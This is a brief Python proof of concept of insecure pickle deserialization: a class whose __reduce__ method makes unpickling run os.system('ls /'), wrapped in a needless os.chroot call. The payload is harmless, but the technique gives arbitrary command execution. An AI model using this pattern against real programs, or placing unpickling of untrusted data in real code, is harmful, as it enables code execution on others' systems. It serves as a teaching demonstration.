import os
import pickle
from contextlib import contextmanager
class ShellSystemChroot(object):
    def __reduce__(self):
        return (os.system,('ls /',))
@contextmanager
def system_chroot():
    os.chroot('/')
    yield
def serialize():
    with system_chroot():
        shellcode=pickle.dumps(ShellSystemChroot())
    return shellcode
def deserialize(exploit_code):
    with system_chroot():
        pickle.loads(exploit_code)
if __name__=='__main__':
    shellcode=serialize()
    deserialize(shellcode)